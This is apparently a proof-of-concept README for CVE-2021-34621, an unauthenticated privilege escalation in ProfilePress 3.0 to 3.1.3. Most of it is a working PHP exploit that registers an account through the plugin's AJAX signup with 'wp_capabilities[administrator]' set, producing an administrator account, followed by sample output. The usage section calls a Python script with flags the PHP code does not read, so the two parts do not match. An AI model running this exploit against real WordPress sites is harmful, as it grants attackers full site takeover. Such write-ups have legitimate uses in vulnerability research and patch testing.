# CVE-2021-34621
ProfilePress 3.0 - 3.1.3 - Unauthenticated Privilege Escalation

# Description
The user registration functionality of the plugin allowed arbitrary user meta to be supplied, including wp_capabilities, during registration which made it possible for users to register as an administrator. 

# POC
```

<?php
// Settings

$wp_url = $argv[1];
// Update Settings
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $wp_url . '/wp-admin/admin-ajax.php');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, [
    'reg_username' => 'Hax0r',
    'reg_email' => 'Hax0r@Hax0r.com',
    'reg_password' => 'password',
    'reg_password_present' => 'true',
    'reg_first_name' => 'Hax0r',
    'reg_last_name' => 'Hax0r',
    'wp_capabilities[administrator]' => '1',
    'action' => 'pp_ajax_signup',
    'melange_id' => ''

]);

$output = curl_exec($ch);
curl_close($ch);
print_r($output);
```

Script Usage
---

```
$ python3 CVE-2021-34621.py --url http://wordpress.lan --username test2 --email test2@test.com --password test
{"message":"<div class=\"profilepress-reg-status success\">Registration successful.<\/div>"}
```
